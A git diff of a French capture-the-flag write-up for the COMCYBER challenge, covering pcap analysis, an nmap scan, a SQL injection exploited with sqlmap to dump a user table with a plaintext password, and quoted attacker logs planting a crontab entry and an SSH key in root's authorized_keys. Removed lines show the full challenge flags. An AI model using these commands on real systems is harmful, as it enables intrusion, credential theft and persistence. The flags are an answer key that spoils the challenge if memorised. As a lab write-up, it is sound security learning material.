@@ -1,51 +1,56 @@
 view: writeup
 language: en
 seo:
-  title: Capture The Flags, COMCYBER challenges
+  title: "Capture The Flags, COMCYBER challenges : testez vos compétences cyber en condition réelle"
   description: Mettez vos compétences en cybersécurité au service de l'armée de Terre dans un challenge immersif organisé par le Commandement de la cyberdéfense.
-  keywords: ctf, security, comcyber
+  keywords: ctf, cybersécurité, comcyber, challenges, défis cybersécurité, wireshark
   author: Antoine Benevaut
   twitter: "@abenevaut"
   og-image: https://www.abenevaut.dev/images/abenevaut-og.webp
   url: https://www.abenevaut.dev/2024-comcyber.html
 
 article:
-  contentCategory: "Capture The Flags"
-  contentTitle: "COMCYBER challenges"
+  contentCategory: "Capture the flags (CTF)"
+  contentTitle: "CTF COMCYBER : votre entrée dans l'univers des défis cyber"
   contentBody: "<p class='mt-6'>
-    Missions exceptionnelles, environnement hors du commun : venez découvrir les opérations militaires d'un sous-officier cyber.
-    6 flags sont à trouver au total.
+    Missions exceptionnelles, environnement hors du commun : découvrez les opérations militaires d'un sous-officier cyber à travers un CTF immersif.
+    Trouvez les 6 flags cachés et dévoilez vos talents en cybersécurité.
     </p>"
   caption: "“Mettez vos compétences en cybersécurité au service de l'armée de Terre dans un challenge immersif organisé par le Commandement de la cyberdéfense.”"
   captionImage: images/ctf-2024-comcyber.png.webp
   outlink: "https://comcyber.challenges.pro.root-me.org"
-  outlinkTitle: "Glissez-vous dans la peau d'un cybercombattant"
+  outlinkTitle: "Glissez-vous dans la peau d'un cyber-combattant"
 
-#  stats:
-#    - { label: 'Score', value: '4/6' }
-#    - { label: 'Fun', value: '100%' }
+  stats:
+    - { label: 'Niveau', value: 'Rookie' }
+    - { label: 'Condition', value: 'Réelle' }
+    - { label: 'Flaggé', value: '5/6' }
 
 writeup: |+
   # Write-up
 
-  Opérateur 10 à Cyberphantom. Prenez message :
+  > Opérateur 10 à Cyberphantom. Prenez message :
+  > 
+  > Nous avons perdu la communication avec un véhicule alors que nous sommes en pleine opération.
+  > Nous avons une suspicion de hacking. J'ai besoin de votre diagnostic afin de rétablir la communication avec le véhicule dans les plus brefs délais.
+  > 
+  > Vous trouverez ici les derniers logs de communication entre la station radio et le véhicule. Ces informations devraient vous être utiles.
+  > 
+  > Terminé.
+  
+  Notre investigation commence avec les derniers logs de communication fournit par notre opérateur. 
+  À notre disposition, un fichier [capture.pcap](https://www.abenevaut.dev/images/ctf-2024-comcyber/capture.pcap.zip).
+  
+  ## Analyse avec Wireshark
+  
+  La première étape consiste à examiner les paquets réseaux pour identifier des anomalies.
+  
+  L'investigation met en avant une suite d'actions utilisées pour se renseigner sur la configuration d'un serveur.
+  On comprend que le serveur analysé est la cible et a l'IP `163.172.68.42`. L'attaquant lui, a l'IP `10.10.0.254` et utilise une connection Telnet pour lancer ses commandes et se renseigner sur le serveur.
+  
+  > Ces IPs sont probablement obsolètes, ___évitez de les utiliser sans précautions spécifiques___.
 
-  Nous avons perdu la communication avec un véhicule alors que nous sommes en pleine opération.
-  Nous avons une suspicion de hacking. J'ai besoin de votre diagnostic afin de rétablir la communication avec le véhicule dans les plus brefs délais.
-  
-  Vous trouverez ici les derniers logs de communication entre la station radio et le véhicule. Ces informations devraient vous être utiles.
-  
-  Terminé.
-  
-  --------
-  
-  Cette premiere épreuve nous met à disposition un fichier [capture.pcap](https://www.abenevaut.dev/images/ctf-2024-comcyber/capture.pcap) (packet capture).
-  
-  ## Analyse du fichier capture.pcap
-  
-  En analysant ce fichier avec Wireshark, on peut parcourir la capture des packets réseaux.
-  
-  Une trame d'échange attire notre attention.
+  Une trame suspecte attire notre attention :
   
   ```log
   Frame 83: 148 bytes on wire (1184 bits), 148 bytes captured (1184 bits) on interface any, id 0
@@ -62,54 +67,67 @@ writeup: |+
   0090   72 65 74 0a                                       ret.
   ```
   
-  Elle affiche l'utilisation d'une impression de caractères vers un fichier `/tmp/secret`.
+  La trame contient une commande qui enregistre une chaîne de caractères vers un fichier `/tmp/secret`.
   
   ```shell
   echo Uk17N2FmZjJhNjA3YjEzZjczY2IwOTM2Zjk2ZTY3YjIxMDIwN2FlMDQ3NX0K > /tmp/secret
   ```
+
+  La chaine de caractère est encodée en base64, une fois décodée, elle révèle le premier flag `RM{7aff...}`.
   
-  La chaine de caractère se révèle être une chaine encodée en base64, une fois décodée, nous trouvons notre premier flag.
+  Contrairement à d'autres CTF, ce challenge ne propose pas de site pour valider les flags ni d'indication initiale sur leur nombre.
+  Il s'agit d'une épreuve en conditions réelles où l'investigation continue est essentielle pour progresser.
   
-  ```flag
-  RM{7aff2a607b13f73cb0936f96e67b210207ae0475}
+  Poursuivons!
+  
+  Une seconde trame attire notre attention
+  
+  ```
+  Frame 89: 101 bytes on wire (808 bits), 101 bytes captured (808 bits) on interface any, id 0
+
+  0000   00 00 00 01 00 06 02 42 37 94 7b 6e 02 42 08 00   .......B7.{n.B..
+  0010   45 00 00 55 76 90 00 00 34 06 1d 35 a3 ac 44 2a   E..Uv...4..5..D*
+  0020   0a 0a 00 fe 00 17 9a 30 89 9a 4f a4 80 60 6c ca   .......0..O..`l.
+  0030   80 18 01 fe c4 69 00 00 01 01 08 0a b3 39 27 04   .....i.......9'.
+  0040   b3 12 be ed 6e 65 74 73 74 61 74 20 2d 6e 75 74   ....netstat -nut
+  0050   65 6c 61 70 20 7c 20 67 72 65 70 20 2d 69 20 35   elap | grep -i 5
+  0060   30 30 30 0d 0a                                    000..
   ```
   
-  Le reste de l'analyse du fichier capture.pcap, met en avant des actions pour se renseigner sur la configuration du serveur.
-  [Voir le fichier d'analyse](https://www.abenevaut.dev/images/ctf-2024-comcyber/🔍%20Telnet%20-%20Online%20pcap%20files%20viewer%20for%20analyze%20HTTP,%20DNS,%20other%20network%20traffic.pdf) (service gratuit utilisé, https://apackets.com)
-  
-  Le serveur a l'adresse IP suivante 163.172.68.42.
-  
-  Dans le fichier d'analyse des commandes exécutées, une ligne attire notre attention, une commande qui vise à savoir si le port 5000 est ouvert sur la machine.
+  L'attaquant semble vérifier si le port 5000 du serveur est actif
   
   ```shell
   netstat -nutelap | grep -i 5000
   ```
   
-  La commande n'ayant pas de sortie, nous pouvons en déduire que le port 5000 n'est pas ouvert.
+  Néanmoins, la commande ne fournit pas d'output..
+  Confirmons que le port 5000 n'est pas ouvert.
   
-  Qu'est-ce qui pouvait être recherché sur ce port ?
-
-  ## Investigation sur 163.172.68.42 (:5000)
-
-  Confirmons que le port 5000 n'est pas ouvert avec notre propre énumération des ports du serveur :
+  En complément de wireshark, [apackets.com](https://apackets.com) permet un affichage différent des données capturées.
+  [Rapport apackets.com (PDF)](images/ctf-2024-comcyber/apackets-telnet-report.pdf)
+  
+  ## Énumération des ports avec Nmap
+  
+  Grâce à une analyse Nmap, nous découvrons que le port 5000 offre un service HTTP :
 
   ```shell
-  nmap -Pn -sC -sV -O -oN initial
   # on vise l'IP 163.172.68.42
+  nmap -Pn -sC -sV -O -oN initial.nmap
   ```
   
-  Le résultat de l'analyse NMAP confirme que le port 5000 est ouvert et qu'il fournit un service HTTP.
+  Sortie Nmap partielle ([énumération complète](images/ctf-2024-comcyber/initial.nmap)) :
   
   ```markdown
   # NMAP partial output
   PORT     STATE    SERVICE VERSION
   5000/tcp open     http    nginx 1.22.1
   ```
-  [Énumération complete](https://www.abenevaut.dev/images/ctf-2024-comcyber/initial.nmap)
   
-  Lorsque l'on visite ce service http://163.172.68.42:5000, on découvre une page de login.
+  Lorsque l'on visite le service http://163.172.68.42:5000, on découvre une page de login.
   - nous sommes redirigé vers http://163.172.68.42:5000/login
   - on notera qu'avec edge, on voit directement la page de login, avec d'autres navigateurs, il faut faire l'effort de supprimer des balises html pour voir la page de login (peut être une obfuscation volontaire ?)
+  
+  ## Exploitation SQL avec SQLMap
   
   Un test rapide de ce formulaire met en evidence une injection SQL possible.
   
@@ -118,14 +136,13 @@ writeup: |+
   password = "' or 1=1 --"
   ```
   
-  On approfondit l'analyse avec SQLmap.
-  - ligne de commande a adapter, le template est [disponible ici](https://www.abenevaut.dev/images/ctf-2024-comcyber/login.template)
+  Nous allons utiliser SQLMap pour identifier et exploiter l'injection SQL ([fichier `login.template`](images/ctf-2024-comcyber/login.template)).
   
   ```shell
-  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password
+  python3 sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password
   ```
   
-  SQLmap confirme la possibilité d'injection SQL.
+  SQLMap confirme la possibilité d'injection SQL.
   
   ```log
   [22:57:51] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
@@ -149,10 +166,10 @@ writeup: |+
   On recherche le nom des tables disponibles.
   
   ```shell
-  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --tables
+  python3 sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --tables
   ```
   
-  On trouve la table `user`.
+  Cela dévoile une table « user ».
   
   ```log
   [22:59:57] [INFO] retrieved: user
@@ -161,41 +178,39 @@ writeup: |+
   On tente d'exfiltrer les donnees de cette table.
   
   ```shell
-  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --dump -T user
+  python3 sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --dump -T user
   ```
 
   On obtient le dump qui suit :
 
   ```sql
   id,password,username
-  NULL,RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5},admin
+  NULL,RM{a868...},admin
   NULL,MEqvgJqr4W48U7L^eEaR!,alice
   ```
   
-  Cette exfiltration révèle un second flag
+  Cette exfiltration révèle un second flag `RM{a868...}`.
   
-  ```flag
-  RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5}
-  ```
+  Pour les utilisateurs moins familiers, consultez ce [tutoriel SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage).
   
   Bien qu'on puisse déjà se loguer avec l'injection SQL admin et comme password `"' or 1=1 --"`, nous avons maintenant un identifiant valide.
-  - alice / `MEqvgJqr4W48U7L^eEaR!`
+  - `alice` / `MEqvgJqr4W48U7L^eEaR!`
 
-  ## Goliath
+  ## Goliath : Une piste prometteuse
 
   Une fois logué, nous arrivons sur cette interface :
   
-  ![Goliath dashboard](https://www.abenevaut.dev/images/ctf-2024-comcyber/Dashboard%20-%20Personnel%20–%20Microsoft_%20Edge%2004_09_2024%2012_54_31.png.webp)
+  ![Goliath dashboard](https://www.abenevaut.dev/images/ctf-2024-comcyber/goliath-dashboard.webp)
 
-  On remarque une liste de vehicule.
-  Une fois un vehicule selectionne, des informations sur le vehicule apparaissent.
+  On remarque une liste de véhicule.
+  Une fois un véhicule sélectionné, des informations sur le véhicule apparaissent.
   
   Pour le véhicule GOLIATH, ces informations semblent indisponibles et une zone de contenu avec un bouton permet de récupérer des logs.
-  [Le fichier de logs](https://www.abenevaut.dev/images/ctf-2024-comcyber/server.log)
+  [Le fichier de logs](https://www.abenevaut.dev/images/ctf-2024-comcyber/server.log.zip)
   
   > On trouve dans cette meme zone de contenu un bouton "ENABLE COMMUNICATION", qui ouvre une popin avec une identification ; Le formulaire n'a pas eu l'air d'etre exploitable.
   
-  ![Goliath](https://www.abenevaut.dev/images/ctf-2024-comcyber/Dashboard%20-%20Personnel%20–%20Microsoft​%20Edge%2026_09_2024%2017_50_46.png.webp)
+  ![Goliath enable communication](https://www.abenevaut.dev/images/ctf-2024-comcyber/goliath-enable-communication.webp)
   
   Apres investigation, le fichier révèle une commande avec une chaine de caractères encodée en hexadecimal qui doit être ajoutée à la crontab du serveur.
   
@@ -203,17 +218,13 @@ writeup: |+
   Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -) [0]
   ```
   
-  Une fois décodé, on obtient un nouveau flag.
+  Une fois décodé, on obtient un nouveau flag `RM{9853...}`.
   
   ```markdown
-  * * * * * echo 'RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}'
+  * * * * * echo 'RM{9853...}'
   ```
   
-  ```flag
-  RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}
-  ```
-  
-  ## favicon.ico
+  ## Analyse de favicon.ico
   
   En poursuivant l'analyse de ces logs, on trouve une autre commande qui semble être une tentative de recuperation d'un fichier.
   
@@ -240,15 +251,11 @@ writeup: |+
   Le fichier message.txt contient un nouveau flag.
   
   ```flag
-  RM{6ba43cb5eeab217270e9692e939da5341a82d2ff}
+  RM{6ba4...}
   ```
   
-  ```markdown
-  /!\
-  /!\ On notera que le hacker a laissé sa clef SSH sur la machine avant de supprimer ses traces.
-  /!\ -> A SUPPRIMER DONC
-  /!\
-  ```
+  >> /!\ On notera que le hacker a laissé sa clef SSH sur la machine avant de supprimer ses traces.
+  >> /!\ -> A SUPPRIMER DONC
   
   ```log
   Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo 'ssh-rsa AAAAB3NzKV0CWVq3ngl2ThMYDfPehFMEBggHMwQsFqGYirCYEt+XOQWs5wHEZzhDTRfIR29Vgi3UqWOZ2+ddwq5xmcSMwk6BY+sZVRwxuSvNKXnz0jfrz667poinUJD8LRDAiBujt0fbyNpb8aKqAQxPwvRkWIRuktfZk9vs3zjzFYhQRIhn7geAPFCywOfBJVkUfD9mfYow9pihhKnXSvEB/z81edCzXerGxUQ1ztFXZsZmaS5Th1fPF3Vq0dz7kDNo95TP64qO6NY8PS5vbFgw0bppOlK8a8lNw04Zco7iNKtI90+UAfkgookBcG/TkhMcnqk9YTpt+qli1dD7RcxbNBsJBvWDxQYSsBDYsJsBr36TaVpewxWkiPjfTpsvLJGC7SFNX13msjgOFgzzWlMKUrYvsEqprBr6h3cI30Ql1o5HpbL/M04i9UPf+KpvY5PUBX94QbrOFthV/K1gpi/thkBhFqooT9/tnQiIxw== kali@attacker' >> /root/.ssh/authorized_keys) [0]
@@ -258,13 +265,13 @@ writeup: |+
   Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf /tmp/hack) [0]
   ```
   
-  ## m4lw3r3
+  ## Étude de m4lw3r3
   
   Le fichier m4lw3r3 est un fichier binaire (`ELF 64-bit GNU/Linux 3.2.0`).
   Nous pouvons l'exécuter sur une machine dédiée et sécurisée pour voir ce qu'il fait.
   
   L'outil https://any.run/ ne révèle pas d'action malveillante (pas d'activité sur le réseau, pas de modification de fichier, pas de modification de registre).
-  [L'outil https://www.hybrid-analysis.com ne révèle rien non plus](https://www.abenevaut.dev/images/ctf-2024-comcyber/Free%20Automated%20Malware%20Analysis%20Service%20-%20powered%20by%20Falcon%20Sandbox.pdf)
+  [L'outil https://www.hybrid-analysis.com ne révèle rien non plus](https://www.abenevaut.dev/images/ctf-2024-comcyber/Free-Automated-Malware-Analysis-Service-powered-by-Falcon-Sandbox.pdf)
   
   Apres la mise en place d'une sandbox Linux/Kali, on peut exécuter le fichier librement.
   
@@ -279,18 +286,14 @@ writeup: |+
   
   On continue l'analyse du binaire avec [IDA Free](https://hex-rays.com/ida-free/) qui présente une cartographie complète du fonctionnement du binaire.
   
-  ![input 1](https://www.abenevaut.dev/images/ctf-2024-comcyber/IDA-capture1-flag-input1-Capture%20d’écran%202024-09-25%20à%2022.33.48.png.webp)
+  ![IDA flag input 1](https://www.abenevaut.dev/images/ctf-2024-comcyber/IDA-capture1-flag-input1.webp)
   
-  Un premier flag, à peine masque, est découvert.
-  
-  ```flag
-  RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7}
-  ```
+  Un premier flag, à peine masqué, est découvert `RM{6762...}`.
   
   Lors d'une nouvelle execution, le binaire confirme le premier argument
   
   ```
-  ./m4lw3r3 RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7} input2
+  ./m4lw3r3 RM{6762...} input2
   ```
   
   ## Input2, OpenSSL ?
@@ -314,7 +317,7 @@ writeup: |+
   // 0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c598173f31415ff710696318d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb30a5d480cf4e34339c5e06acc76574cfbea08a4fca2c73388b4e08831f8e037489092346809d7c164ab270a5e04ae40a327c99590da89025ac48aa5
   ```
   
-  ![hexa m4lw3r3](https://www.abenevaut.dev/images/ctf-2024-comcyber/hexa%20-%20m4lw3r3%2026_09_2024%2014_21_56.png.webp)
+  ![hexa m4lw3r3](https://www.abenevaut.dev/images/ctf-2024-comcyber/hexa-m4lw3r3.webp)
   
   Durant l'investigation, j'ai découvert l'outil en ligne https://dogbolt.org qui permet de désassembler en ligne avec plusieurs outils concurrents, mais complémentaires.
   Deux (Dewolf et RetDec) m'ont permis d'émettre des hypothèses sur la résolution de ce dernier challenge.
@@ -334,11 +337,3 @@ writeup: |+
   Je suis ravi qu'il n'y ait pas eu d'OSINT, le challenge aurait pu s'arrêter beaucoup plus tôt pour moi.
   
   Merci aux équipes qui ont organisé cet événement.
-  
-  ```flags
-  RM{7aff2a607b13f73cb0936f96e67b210207ae0475}
-  RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5}
-  RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}
-  RM{6ba43cb5eeab217270e9692e939da5341a82d2ff}
-  RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7}
-  ```
